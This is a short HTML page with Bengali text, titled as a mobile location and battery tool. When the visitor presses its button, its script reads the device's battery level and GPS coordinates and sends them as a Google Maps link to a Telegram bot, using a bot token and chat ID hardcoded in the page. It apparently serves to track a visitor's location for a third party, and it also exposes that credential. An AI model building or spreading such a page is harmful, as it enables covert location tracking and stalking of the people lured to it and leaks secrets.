<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>📍 লোকেশন ও ব্যাটারি তথ্য</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #eef;
      padding: 30px;
      text-align: center;
    }
    .box {
      background: #fff;
      padding: 20px;
      max-width: 400px;
      margin: auto;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    button {
      padding: 12px;
      font-size: 16px;
      background: green;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 10px;
    }
    .status {
      margin-top: 15px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>📡 মোবাইল লোকেশন ও ব্যাটারি</h2>
    <button onclick="sendInfo()">📍 তথ্য পাঠাও</button>
    <div class="status" id="status">📭 অপেক্ষা করছি...</div>
  </div>

  <script>
    const BOT_TOKEN = '7868941323:AAE35R5cQ16Tl1CQpcQNstWl6mMcFLba5_A';
    const CHAT_ID = '1054739462';

    async function sendInfo() {
      document.getElementById("status").innerText = "🔄 তথ্য সংগ্রহ হচ্ছে...";

      let batteryLevel = "অজানা";
      let locationURL = "লোকেশন পাওয়া যায়নি";

      // ব্যাটারি লেভেল
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          batteryLevel = `${Math.round(battery.level * 100)}%`;
        } catch (err) {
          console.log("Battery error:", err);
        }
      }

      // লোকেশন
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          locationURL = `https://www.google.com/maps?q=${lat},${lon}`;
          sendToTelegram(batteryLevel, locationURL);
        }, function(err) {
          sendToTelegram(batteryLevel, locationURL);
        });
      } else {
        sendToTelegram(batteryLevel, locationURL);
      }
    }

    function sendToTelegram(battery, location) {
      const text = `📱 মোবাইল তথ্য:
🔋 ব্যাটারি: ${battery}
🌍 লোকেশন: ${location}`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      }).then(res => {
        if (res.ok) {
          document.getElementById("status").innerText = "✅ তথ্য সফলভাবে পাঠানো হয়েছে!";
        } else {
          document.getElementById("status").innerText = "❌ পাঠানো যায়নি!";
        }
      }).catch(err => {
        document.getElementById("status").innerText = "🚫 নেটওয়ার্ক সমস্যা!";
        console.error(err);
      });
    }
  </script>
</body>
</html>
